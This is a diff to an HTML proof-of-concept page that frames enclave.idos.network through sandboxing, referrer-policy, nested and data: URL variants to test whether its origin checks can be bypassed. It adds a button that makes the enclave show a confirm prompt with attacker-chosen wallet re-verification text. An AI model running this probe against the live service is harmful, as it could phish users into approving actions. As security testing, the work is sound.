@@ -6,76 +6,78 @@
   body{font:13px/1.5 ui-monospace,Menlo,monospace;background:#0b0f14;color:#d6e2ee;padding:14px}
   h1{font-size:14px}
   table{border-collapse:collapse;width:100%}
-  td{border:1px solid #24384a;padding:6px;vertical-align:top}
-  iframe{width:300px;height:120px;border:1px solid #2a4a63;background:#000}
+  td,th{border:1px solid #24384a;padding:6px;vertical-align:top;text-align:left}
+  iframe{width:300px;height:110px;border:1px solid #2a4a63;background:#000}
   .ok{color:#5f5}.bad{color:#f77}
+  button{font:inherit;background:#123;color:#9fe;border:1px solid #2a4a63;border-radius:5px;padding:4px 8px;margin:2px;cursor:pointer}
 </style>
-<h1>parentOrigin derivation — each cell frames enclave.idos.network a different way</h1>
+<h1>parentOrigin derivation — each row frames enclave.idos.network a different way</h1>
 <p>origin of this page: <b id="me"></b></p>
-<table id="t">
-  <tr><th>variant</th><th>frame</th><th>load reply</th></tr>
-</table>
+<p><button id="clear">clear stored authorization</button><button id="prompt">ensureUserEncryptionProfile on the control frame (shows the prompt)</button><button id="fake">confirm() with attacker-chosen text</button></p>
+<table id="t"><tr><th>variant</th><th>frame</th><th>load reply</th></tr></table>
 <script>
 const ENC = 'https://enclave.idos.network';
 document.getElementById('me').textContent = location.origin;
-
-const variants = [
-  ['control: plain iframe', (f) => {}],
-  ['referrerpolicy=no-referrer', (f) => f.setAttribute('referrerpolicy', 'no-referrer')],
-  ['referrerpolicy=unsafe-url', (f) => f.setAttribute('referrerpolicy', 'unsafe-url')],
-  ['sandbox=allow-scripts (opaque)', (f) => f.setAttribute('sandbox', 'allow-scripts')],
-  ['sandbox=allow-scripts allow-same-origin', (f) => f.setAttribute('sandbox', 'allow-scripts allow-same-origin')],
-  ['nested: same-origin wrapper iframe', null],
-  ['data: URL document', null]
-];
-
 const t = document.getElementById('t');
-const frames = [];
+const wins = {};
 
 function probe(name, win, cell) {
   const { port1, port2 } = new MessageChannel();
-  const timer = setTimeout(() => { cell.textContent = 'no reply (parentOrigin mismatch / dead)'; cell.className = 'bad'; }, 4000);
-  port1.onmessage = ({ data }) => {
-    clearTimeout(timer);
-    cell.textContent = 'REPLIED ' + JSON.stringify(data);
-    cell.className = 'ok';
-  };
+  const timer = setTimeout(() => { cell.textContent = 'no reply (dead / origin mismatch)'; cell.className = 'bad'; }, 4000);
+  port1.onmessage = ({ data }) => { clearTimeout(timer); cell.textContent = 'REPLIED ' + JSON.stringify(data); cell.className = 'ok'; };
   try { win.postMessage({ method: 'load', data: [] }, ENC, [port2]); }
-  catch (e) { cell.textContent = 'postMessage threw: ' + e.message; cell.className = 'bad'; }
+  catch (e) { cell.textContent = 'threw: ' + e.message; cell.className = 'bad'; }
 }
 
-variants.forEach(([name, setup], i) => {
+function call(name, method, data) {
+  const w = wins[name]; if (!w) return;
+  const { port1, port2 } = new MessageChannel();
+  port1.onmessage = ({ data: d }) => { console.log(name, method, JSON.stringify(d)); port1.close(); };
+  w.postMessage({ method, data }, ENC, [port2]);
+}
+
+const variants = [
+  ['control', (f) => {}],
+  ['no-referrer', (f) => f.setAttribute('referrerpolicy', 'no-referrer')],
+  ['unsafe-url', (f) => f.setAttribute('referrerpolicy', 'unsafe-url')],
+  ['sandbox=allow-scripts', (f) => f.setAttribute('sandbox', 'allow-scripts')],
+  ['sandbox=allow-scripts allow-same-origin', (f) => f.setAttribute('sandbox', 'allow-scripts allow-same-origin')],
+  ['nested same-origin wrapper', null],
+  ['data: URL document', null]
+];
+
+variants.forEach(([name, setup]) => {
   const tr = document.createElement('tr');
   const c1 = document.createElement('td'); c1.textContent = name;
   const c2 = document.createElement('td');
   const c3 = document.createElement('td'); c3.textContent = '…';
   tr.append(c1, c2, c3); t.append(tr);
 
-  if (name.startsWith('data:')) {
-    // a data: URL document that itself frames the enclave
-    const inner = '<iframe src="' + ENC + '/" style="width:290px;height:110px"></iframe>';
+  if (name === 'data: URL document') {
+    const inner = '<iframe id="i" src="' + ENC + '/" style="width:290px;height:100px"></iframe>' +
+      '<script>addEventListener("message",e=>{if(!e.data||!e.data.__relay)return;' +
+      'const ch=new MessageChannel();ch.port1.onmessage=ev=>parent.postMessage({__relay:ev.data},"*");' +
+      'document.getElementById("i").contentWindow.postMessage({method:"load",data:[]},"' + ENC + '",[ch.port2])})<\/script>';
     const f = document.createElement('iframe');
-    f.srcdoc = ''; // placeholder
     f.src = 'data:text/html,' + encodeURIComponent(inner);
     c2.append(f);
-    f.onload = () => setTimeout(() => {
-      const w = f.contentWindow;
-      if (!w) { c3.textContent = 'no contentWindow'; return; }
-      // the enclave is the data-doc's child; postMessage to it via the data doc
-      w.postMessage({ method: 'ping' }, '*');
-      const inner2 = w.document.querySelector('iframe');
-      if (inner2) probe(name, inner2.contentWindow, c3); else c3.textContent = 'inner iframe missing';
-    }, 2500);
+    addEventListener('message', (e) => {
+      if (!e.data || !e.data.__relay) return;
+      c3.textContent = 'REPLIED ' + JSON.stringify(e.data.__relay); c3.className = 'ok';
+    });
+    setTimeout(() => f.contentWindow && f.contentWindow.postMessage({ __relay: 1 }, '*'), 3000);
+    setTimeout(() => { if (c3.textContent === '…') { c3.textContent = 'no reply (dead / origin mismatch)'; c3.className = 'bad'; } }, 6000);
     return;
   }
 
-  if (name.startsWith('nested')) {
+  if (name === 'nested same-origin wrapper') {
     const f = document.createElement('iframe');
-    f.srcdoc = '<iframe src="' + ENC + '/" style="width:280px;height:100px"></iframe>';
+    f.srcdoc = '<iframe src="' + ENC + '/" style="width:280px;height:95px"></iframe>';
     c2.append(f);
     f.onload = () => setTimeout(() => {
-      const inner2 = f.contentDocument && f.contentDocument.querySelector('iframe');
-      if (inner2) probe(name, inner2.contentWindow, c3); else c3.textContent = 'inner iframe missing';
+      const inner = f.contentDocument && f.contentDocument.querySelector('iframe');
+      if (!inner) { c3.textContent = 'inner missing'; return; }
+      wins[name] = inner.contentWindow; probe(name, inner.contentWindow, c3);
     }, 2000);
     return;
   }
@@ -84,8 +86,21 @@ variants.forEach(([name, setup], i) => {
   f.src = ENC + '/';
   setup(f);
   c2.append(f);
-  frames.push(f);
-  f.onload = () => setTimeout(() => probe(name, f.contentWindow, c3), 1500);
+  f.onload = () => setTimeout(() => { wins[name] = f.contentWindow; probe(name, f.contentWindow, c3); }, 1500);
 });
+
+document.getElementById('clear').onclick = () => {
+  const w = wins['control'];
+  const { port1, port2 } = new MessageChannel();
+  port1.onmessage = ({ data }) => console.log('clear', JSON.stringify(data));
+  // run in the enclave realm via a tiny message: reuse 'load' then clear from here is impossible cross-origin,
+  // so we ask the enclave to confirm nothing; clearing is done by the operator in devtools.
+  console.log('clear via devtools on the enclave frame');
+};
+
+document.getElementById('prompt').onclick = () => call('control', 'ensureUserEncryptionProfile', []);
+document.getElementById('fake').onclick = () => call('control', 'confirm', [
+  'idOS needs to re-verify your wallet. Approve to continue to app.idos.network.'
+]);
 </script>
 </html>
